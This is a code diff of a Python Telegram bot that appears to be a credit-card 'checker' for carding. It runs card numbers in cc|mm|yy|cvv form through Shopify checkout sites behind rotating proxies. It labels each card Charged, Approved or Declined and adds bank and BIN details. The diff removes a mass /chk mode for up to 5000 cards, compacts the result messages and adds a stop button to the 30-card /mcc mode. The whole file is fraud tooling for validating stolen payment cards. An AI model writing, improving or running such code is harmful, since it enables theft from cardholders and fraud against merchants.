@@ -83,19 +83,22 @@ def get_file_lines(filepath):
 
 def load_premium_users():
     if not os.path.exists(PREMIUM_USERS_FILE):
-        with open(PREMIUM_USERS_FILE, 'w') as f:
+        with open(PREMIUM_USERS_FILE, 'w', encoding='utf-8') as f:
             for admin in ADMIN_ID:
                 f.write(f"{admin}\n")
         return [str(admin) for admin in ADMIN_ID]
     try:
         with open(PREMIUM_USERS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
             users = [line.strip() for line in f if line.strip()]
+        needs_write = False
         for admin in ADMIN_ID:
             if str(admin) not in users:
                 users.append(str(admin))
-                with open(PREMIUM_USERS_FILE, 'w') as f:
-                    for u in users:
-                        f.write(f"{u}\n")
+                needs_write = True
+        if needs_write:
+            with open(PREMIUM_USERS_FILE, 'w', encoding='utf-8') as f:
+                for u in users:
+                    f.write(f"{u}\n")
         return users
     except Exception as e:
         print(f"Error loading premium users: {e}")
@@ -265,7 +268,7 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2):
     if not sites:
         return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
     if not proxies:
-         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
+        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
 
     for attempt in range(max_retries):
         site = random.choice(sites)
@@ -283,143 +286,6 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2):
         return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}
     
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}
-
-# ========== UPDATED: Added checker username ==========
-async def send_realtime_hit(user_id, result, hit_type, username):
-    emoji = "✅" if hit_type == "Charged" else "🔥"
-    status_text = "CHARGED" if hit_type == "Charged" else "APPROVED"
-
-    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
-
-    message = f"""{status_text}
-
-💳 CC <code>{result['card']}</code>
-
-🛒 Gateway {result.get('gateway', 'Unknown')}
-📝 Response {result['message'][:150]}
-💸 Price {result.get('price', '-')}
-
-🆔 BIN Info {brand} - {bin_type} - {level}
-🏦 Bank {bank}
-🥰 Country {country} {flag}
-
-👤 Checked by @{username}"""
-
-    try:
-        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
-    except:
-        pass
-
-async def update_progress(user_id, message_id, results, current_attempt_count):
-    elapsed = int(time.time() - results['start_time'])
-    hours = elapsed // 3600
-    minutes = (elapsed % 3600) // 60
-    seconds = elapsed % 60
-
-    progress_text = f""" 💳  Card: <code>{results.get('last_card', 'None')}</code>
-    
-💰 {results.get('last_price', '-')}
-    
-📝 {results.get('last_response', 'Waiting...')[:30]}
-    """
-
-    buttons = [
-        [Button.inline(f" CHARGED {len(results['charged'])}", b"none", style="success")],
-        [Button.inline(f" APPROVED {len(results['approved'])}", b"none", style="primary")],
-        [Button.inline(f" DECLINED {len(results['dead'])}", b"none", style="danger")],
-        [Button.inline(" STOP", f"stop_{user_id}".encode(), style="danger")]
-    ]
-
-    try:
-        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
-    except:
-        pass
-
-# ========== UPDATED: Added username param ==========
-async def send_final_results(user_id, results, username):
-    elapsed = int(time.time() - results['start_time'])
-    hours = elapsed // 3600
-    minutes = (elapsed % 3600) // 60
-    seconds = elapsed % 60
-
-    hits_text = ""
-    if results['charged']:
-        for r in results['charged'][:5]:
-            hits_text += f" <code>{r['card']}</code>\n"
-    if results['approved']:
-        for r in results['approved'][:5]:
-            hits_text += f" <code>{r['card']}</code>\n"
-
-    if not hits_text:
-        hits_text = "No hits found"
-
-    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
-
-    summary = f"""✅ Check Complete! ✅
-
-📊 Results:
-   ┣ ✅ Charged: {len(results['charged'])}
-   ┣ 🔥 Approved: {len(results['approved'])}
-   ┣ ❌ Declined: {len(results['dead'])}
-   ┗ 📊 Total: {results['total']}
-
-Hits:
-{hits_text}
-
-👤 Checked by @{username}
-
-🐱 Make By MEOW MEOW"""
-
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filename = f"meow{timestamp}.txt"
-
-    async with aiofiles.open(filename, 'w') as f:
-        await f.write("═" * 55 + "\n")
-        await f.write("  CC CHECKER RESULTS\n")
-        await f.write(f"  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        await f.write(f"  Total: {results['total']} | Charged: {len(results['charged'])} | Approved: {len(results['approved'])} | Declined: {len(results['dead'])}\n")
-        await f.write("═" * 55 + "\n\n")
-
-        if results['charged']:
-            await f.write(f"💎 CHARGED ({len(results['charged'])}):\n")
-            await f.write("─" * 55 + "\n")
-            for i, r in enumerate(results['charged'], 1):
-                await f.write(f"{i}. {r['card']}\n")
-                await f.write(f"   ├─ Site    : {r.get('site', 'Unknown')}\n")
-                await f.write(f"   ├─ Gateway : {r.get('gateway', 'Unknown')}\n")
-                await f.write(f"   ├─ Price   : {r.get('price', '-')}\n")
-                await f.write(f"   └─ Response: {r.get('message', '-')}\n\n")
-
-        if results['approved']:
-            await f.write(f"✅ APPROVED ({len(results['approved'])}):\n")
-            await f.write("─" * 55 + "\n")
-            for i, r in enumerate(results['approved'], 1):
-                await f.write(f"{i}. {r['card']}\n")
-                await f.write(f"   ├─ Site    : {r.get('site', 'Unknown')}\n")
-                await f.write(f"   ├─ Gateway : {r.get('gateway', 'Unknown')}\n")
-                await f.write(f"   ├─ Price   : {r.get('price', '-')}\n")
-                await f.write(f"   └─ Response: {r.get('message', '-')}\n\n")
-
-        if results['dead']:
-            await f.write(f"❌ DECLINED ({len(results['dead'])}):\n")
-            await f.write("─" * 55 + "\n")
-            for i, r in enumerate(results['dead'], 1):
-                await f.write(f"{i}. {r['card']}\n")
-                await f.write(f"   ├─ Site    : {r.get('site', 'Unknown')}\n")
-                await f.write(f"   ├─ Gateway : {r.get('gateway', 'Unknown')}\n")
-                await f.write(f"   ├─ Price   : {r.get('price', '-')}\n")
-                await f.write(f"   └─ Response: {r.get('message', '-')}\n\n")
-
-        await f.write("═" * 55 + "\n")
-        await f.write("  🐱 Make By MEOW MEOW\n")
-        await f.write("═" * 55 + "\n")
-
-    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
-
-    try:
-        os.remove(filename)
-    except:
-        pass
 
 
 async def test_site(site, proxy):
@@ -516,8 +382,7 @@ async def show_commands_callback(event):
 
 🛒 Shopify
 ├─ <code>/cc cc|mm|yy|cvv</code> → Check single card
-├─ <code>/mcc</code> → Multi single-check (up to 30 cards)
-└─ <code>/chk</code> → Mass check from .txt file
+└─ <code>/mcc</code> → Multi single-check (up to 30 cards)
 
 🔧 Site Management
 ├─ <code>/site</code> → Check & remove dead sites
@@ -634,179 +499,21 @@ async def single_cc_check(event):
         else:
             status_header = "❌ DECLINED"
 
-        final_resp = f"""{status_header}
+        # --- Compact A + Site conditional ---
+        bin_info = f"{brand} - {bin_type} - {level}" if brand != '-' else '-'
+        country_info = f"{country} {flag}" if country != '-' else '-'
 
-💳 CC <code>{result['card']}</code>
+        final_resp = f"""{status_header} — {result.get('gateway', 'Unknown')} — {result.get('price', '-')}
+💳 <code>{result['card']}</code>
+🏦 {bank} • {bin_info} • {country_info}"""
 
-🛒 Gateway {result.get('gateway', 'Unknown')}
-📝 Response {result['message'][:150]}
-💸 Price {result.get('price', '-')}
-
-🆔 BIN Info {brand} - {bin_type} - {level}
-🏦 Bank {bank}
-🥰 Country {country} {flag}
-
-👤 Checked by @{username}
-
-🐱 Make By MEOW MEOW"""
+        if result['status'] in ('Charged', 'Approved'):
+            final_resp += f"\n🌐 {result.get('site', 'Unknown')}"
 
         await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
 
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
-
-@bot.on(events.NewMessage(pattern='/chk'))
-async def check_command(event):
-    user_id = event.sender_id
-
-    if user_id not in ADMIN_ID:
-        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
-        return
-
-    try:
-        sender = await event.get_sender()
-        username = sender.username if sender.username else f"user_{user_id}"
-    except:
-        username = f"user_{user_id}"
-
-    if not event.reply_to_msg_id:
-        await event.reply(premium_emoji("❌ Please reply to a .txt file containing cards."), parse_mode='html')
-        return
-
-    reply_msg = await event.get_reply_message()
-    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
-        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
-        return
-
-    if not load_sites():
-        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
-        return
-    if not load_proxies():
-        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
-        return
-
-    status_msg = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html')
-
-    file_path = await reply_msg.download_media()
-
-    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-        content = await f.read()
-
-    cards = extract_cc(content)
-
-    if not cards:
-        await status_msg.edit(premium_emoji("❌ No valid cards found in file."), parse_mode='html')
-        os.remove(file_path)
-        return
-
-    if len(cards) > 5000:
-        await status_msg.edit(premium_emoji(f"⚠️ File contains {len(cards)} cards. Limiting to first 5000."), parse_mode='html')
-        cards = cards[:5000]
-
-    os.remove(file_path)
-
-    total_cards = len(cards)
-    await status_msg.edit(premium_emoji(f"🔥 Starting check for {total_cards} cards..."), parse_mode='html')
-
-    session_key = f"{user_id}_{status_msg.id}"
-    active_sessions[session_key] = {'paused': False}
-
-    all_results = {
-        'charged': [],
-        'approved': [],
-        'dead': [],
-        'total': total_cards,
-        'checked': 0,
-        'start_time': time.time(),
-        'last_card': '',
-        'last_response': '',
-        'last_price': '-',
-        'last_gateway': 'Unknown'
-    }
-
-    try:
-        queue = asyncio.Queue()
-        for card in cards:
-            queue.put_nowait(card)
-            
-        last_update_time = [time.time()]
-
-        async def worker():
-            while not queue.empty() and session_key in active_sessions:
-                session_state = active_sessions.get(session_key)
-                if not session_state:
-                    break
-                while session_state.get('paused', False):
-                    await asyncio.sleep(1)
-                    session_state = active_sessions.get(session_key)
-                    if not session_state:
-                        return
-                        
-                try:
-                    card = queue.get_nowait()
-                except asyncio.QueueEmpty:
-                    break
-                    
-                current_sites = load_sites()
-                current_proxies = load_proxies()
-                if not current_sites or not current_proxies:
-                    break
-                
-                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
-                
-                all_results['checked'] += 1
-                all_results['last_card'] = card
-                all_results['last_response'] = res.get('message', '')[:50]
-                all_results['last_price'] = res.get('price', '-')
-                all_results['last_gateway'] = res.get('gateway', 'Unknown')
-                
-                if res['status'] == 'Charged':
-                    all_results['charged'].append(res)
-                    await send_realtime_hit(user_id, res, 'Charged', username)
-                elif res['status'] == 'Approved':
-                    all_results['approved'].append(res)
-                    await send_realtime_hit(user_id, res, 'Approved', username)
-                else:
-                    all_results['dead'].append(res)
-                    
-                queue.task_done()
-                
-                now = time.time()
-                if now - last_update_time[0] >= 1.0:
-                    last_update_time[0] = now
-                    if session_key in active_sessions:
-                        try:
-                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
-                        except Exception:
-                            pass
-
-        workers = [asyncio.create_task(worker()) for _ in range(10)]
-        
-        while workers:
-            if session_key not in active_sessions:
-                for w in workers:
-                    if not w.done():
-                        w.cancel()
-                break
-            done, pending = await asyncio.wait(workers, timeout=1.0)
-            workers = list(pending)
-        
-        if session_key in active_sessions:
-            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
-
-    except Exception as e:
-        await bot.send_message(user_id, premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')
-    finally:
-        if session_key in active_sessions:
-            del active_sessions[session_key]
-
-        try:
-            await status_msg.delete()
-        except:
-            pass
-
-        await send_final_results(user_id, all_results, username)
-
 # ========== NEW: /mcc command ==========
 @bot.on(events.NewMessage(pattern='/mcc'))
 async def multi_cc_check(event):
@@ -876,7 +583,8 @@ async def multi_cc_check(event):
     approved = []
     declined = []
     session_key = f"mcc_{user_id}_{status_msg.id}"
-    active_sessions[session_key] = {'paused': False}
+    stop_callback = f"stop_mcc_{user_id}_{status_msg.id}".encode()
+    active_sessions[session_key] = {}
 
     try:
         queue = asyncio.Queue()
@@ -889,15 +597,6 @@ async def multi_cc_check(event):
 
         async def mcc_worker():
             while not queue.empty() and session_key in active_sessions:
-                session_state = active_sessions.get(session_key)
-                if not session_state:
-                    break
-                while session_state.get('paused', False):
-                    await asyncio.sleep(0.5)
-                    session_state = active_sessions.get(session_key)
-                    if not session_state:
-                        return
-
                 try:
                     card = queue.get_nowait()
                 except asyncio.QueueEmpty:
@@ -906,14 +605,23 @@ async def multi_cc_check(event):
                 current_sites = load_sites()
                 current_proxies = load_proxies()
                 if not current_sites or not current_proxies:
-                    break
+                    async with lock:
+                        checked_count[0] += 1
+                        declined.append({
+                            'status': 'Dead',
+                            'message': 'No sites/proxies available',
+                            'card': card,
+                            'site': 'Unknown',
+                            'gateway': 'Unknown',
+                            'price': '-'
+                        })
+                    queue.task_done()
+                    continue
 
                 res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=3)
 
-                # --- BIN info ---
                 brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
 
-                # --- Status header ---
                 if res['status'] == 'Charged':
                     status_header = "💎 CHARGED"
                     charged.append(res)
@@ -924,23 +632,16 @@ async def multi_cc_check(event):
                     status_header = "❌ DECLINED"
                     declined.append(res)
 
-                # --- Build response with Site ---
-                message = f"""{status_header}
+                # --- Compact A + Site conditional ---
+                bin_info = f"{brand} - {bin_type} - {level}" if brand != '-' else '-'
+                country_info = f"{country} {flag}" if country != '-' else '-'
 
-💳 CC <code>{res['card']}</code>
+                message = f"""{status_header} — {res.get('gateway', 'Unknown')} — {res.get('price', '-')}
+💳 <code>{res['card']}</code>
+🏦 {bank} • {bin_info} • {country_info}"""
 
-🌐 Site {res.get('site', 'Unknown')}
-🛒 Gateway {res.get('gateway', 'Unknown')}
-💸 Price {res.get('price', '-')}
-📝 Response {res.get('message', '-')[:200]}
-
-🆔 BIN Info {brand} - {bin_type} - {level}
-🏦 Bank {bank}
-🥰 Country {country} {flag}
-
-👤 Checked by @{username}
-
-🐱 Make By MEOW MEOW"""
+                if res['status'] in ('Charged', 'Approved'):
+                    message += f"\n🌐 {res.get('site', 'Unknown')}"
 
                 # --- Send inline result ---
                 try:
@@ -964,6 +665,9 @@ async def multi_cc_check(event):
                                     f"⏳ Progress: <b>{checked_count[0]}/{total}</b>\n"
                                     f"💎 Charged: {len(charged)} | ✅ Approved: {len(approved)} | ❌ Declined: {len(declined)}"
                                 ),
+                                buttons=[
+                                    [Button.inline("🛑 STOP", stop_callback, style="danger")]
+                                ],
                                 parse_mode='html'
                             )
                         except Exception:
@@ -983,7 +687,7 @@ async def multi_cc_check(event):
             done, pending = await asyncio.wait(workers, timeout=1.0)
             workers = list(pending)
 
-        # --- Final summary with Site ---
+        # --- Final summary ---
         if session_key in active_sessions:
             try:
                 await status_msg.delete()
@@ -1585,16 +1289,19 @@ async def get_all_sites(event):
         pass
 
 
-@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
-async def stop_handler(event):
+@bot.on(events.CallbackQuery(pattern=rb"stop_mcc_(\d+)_(\d+)"))
+async def stop_mcc_handler(event):
     match = event.pattern_match
     user_id = int(match.group(1).decode())
-    message_id = event.message_id
-    session_key = f"{user_id}_{message_id}"
+    message_id = int(match.group(2).decode())
+    session_key = f"mcc_{user_id}_{message_id}"
     if session_key in active_sessions:
         del active_sessions[session_key]
-        await event.answer(" Stopped", alert=True)
-        await event.edit(premium_emoji("🛑 Checking stopped by user."), parse_mode='html')
+        await event.answer("🛑 Stopped", alert=True)
+        try:
+            await event.edit(premium_emoji("🛑 Checking stopped by user."), parse_mode='html')
+        except:
+            pass
 
 print("✅ Bot started successfully!")
 bot.run_until_disconnected()
